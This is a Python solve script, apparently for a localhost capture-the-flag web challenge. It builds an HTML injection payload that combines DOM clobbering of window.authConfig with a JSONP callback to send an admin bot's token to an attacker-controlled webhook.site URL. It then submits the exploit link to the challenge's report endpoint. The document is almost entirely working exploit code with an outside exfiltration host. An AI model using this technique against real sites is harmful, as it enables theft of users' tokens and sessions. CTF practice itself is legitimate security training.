import requests
import urllib.parse
import sys

# --- Configuration ---
CHALLENGE_URL = "http://localhost:3000"

# YOU MUST PROVIDE YOUR WEBHOOK URL HERE (e.g., from webhook.site)
# Example: WEBHOOK_URL = "https://webhook.site/YOUR-UUID-HERE"
WEBHOOK_URL = "	https://webhook.site/6a5b96b6-4396-4c89-bfcd-e8cede66efb2" 

if WEBHOOK_URL == "https://eoXXXXXXXXXXXXX.m.pipedream.net":
    print("[-] Please edit solve.py and set your WEBHOOK_URL first!")
    sys.exit(1)

# Ensure the webhook URL has a trailing slash or appropriate format for appending ?token=
if not WEBHOOK_URL.endswith('/'):
    WEBHOOK_URL += '/'

# The payload to trigger DOM Clobbering + JSONP Dynamic Script loading
# 1. <form name="authConfig" data-next="https://webhook.site/..." data-append="true"></form> -> Clobbers window.authConfig
# 2. <div data-component="true" data-config='{"path":"/api/","type":"stats?callback=Auth.loginRedirect&"}'></div> -> Triggers JSONP component load

payload_html = f"""<form name="authConfig" data-next="{WEBHOOK_URL}" data-append="true"></form><div data-component="true" data-config='{{"path":"/api/","type":"stats?callback=Auth.loginRedirect&"}}'></div>"""

# URL Encode the payload
encoded_payload = urllib.parse.quote(payload_html)
exploit_url = f"{CHALLENGE_URL}/?q={encoded_payload}"

print(f"[*] Generated Exploit URL:\n{exploit_url}\n")


print(f"[*] Sending report to Admin Bot...")
try:
    response = requests.post(f"{CHALLENGE_URL}/report", json={"url": exploit_url})
    print(f"[*] Report endpoint responded: {response.status_code}")
    print(f"[*] Response: {response.text}")
    print(f"\n[+] The bot should visit the link shortly.")
    print(f"[+] Please check your webhook at: {WEBHOOK_URL}")
except requests.exceptions.ConnectionError:
    print("[-] Error connecting to challenge. Is it running?")
    sys.exit(1)
